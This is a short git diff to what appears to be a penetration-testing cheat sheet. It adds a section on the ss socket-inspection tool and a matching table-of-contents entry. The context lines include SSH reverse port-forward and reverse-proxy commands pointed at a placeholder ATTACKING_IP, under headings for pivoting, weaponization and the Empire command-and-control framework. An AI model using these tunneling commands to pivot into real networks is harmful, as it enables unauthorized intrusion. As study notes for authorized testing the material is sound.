@@ -7,12 +7,13 @@
   - [Weaponization](#weaponization)
 - [PIVOTING](#pivoting)
   - [SSH](#ssh)
+  - [SS](#ss)
   - [PLINK.EXE](#plinkexe)
   - [SOCAT](#socat)
   - [CHISEL](#chisel)
   - [SSHUTTLE](#sshuttle)
   - [PROXY](#proxy)
-  - [SS](#ss)
+  - [SS](#ss-1)
   - [Empire (windows) / Starkiller](#empire-windows--starkiller)
   - [Hop Listener](#hop-listener)
 - [Git Enumeration](#git-enumeration)
@@ -174,6 +175,13 @@ Match junkuser
   - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
   - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
 
+## SS
+- tool to investigate sockets
+- -t: tcp sockets
+- -u: udp sockets
+- -l: listening
+- -p: show process
+- -n: dont resolve names
 
 ## PLINK.EXE
 - command line for putty
